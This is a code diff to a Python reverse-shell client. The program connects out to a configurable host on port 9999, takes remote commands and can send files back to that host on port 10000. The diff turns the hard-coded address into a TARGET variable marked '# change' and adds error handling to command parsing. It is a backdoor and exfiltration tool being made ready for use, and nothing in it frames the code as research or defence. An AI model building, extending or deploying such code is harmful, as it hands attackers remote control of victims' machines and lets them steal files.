@@ -3,6 +3,7 @@ import os
 import subprocess
 from sys import exit
 
+TARGET = '127.0.0.1'
 
 def pwd():
     """Return current working directory."""
@@ -54,7 +55,7 @@ def main():
     conn = socket.socket()
 
     try:
-        conn.connect(('127.0.0.1', 9999))
+        conn.connect((TARGET, 9999)) # change
     except:
         exit()
 
@@ -62,10 +63,12 @@ def main():
         cwd = os.getcwd()
         conn.sendall(f"\n{cwd}:~$$$ ".encode())
         cmd = conn.recv(4096).decode()
-
-        split_command = cmd.rstrip().split(maxsplit=1)
-        command_name = split_command[0].lower()
-        arguments = split_command[1] if len(split_command) > 1 else ""
+        try:
+            split_command = cmd.rstrip().split(maxsplit=1)
+            command_name = split_command[0].lower()
+            arguments = split_command[1] if len(split_command) > 1 else ""
+        except:
+            exit()
 
 
         if command_name == "pwd":
@@ -108,7 +111,7 @@ def main():
             file_path = arguments
             try:
                 send_socket = socket.socket()
-                send_socket.connect(('127.0.0.1', 10000))
+                send_socket.connect((TARGET, 10000))
                 send(send_socket, file_path)
                 conn.sendall(f"Sent file: {split_command[1]}".encode())
                 continue
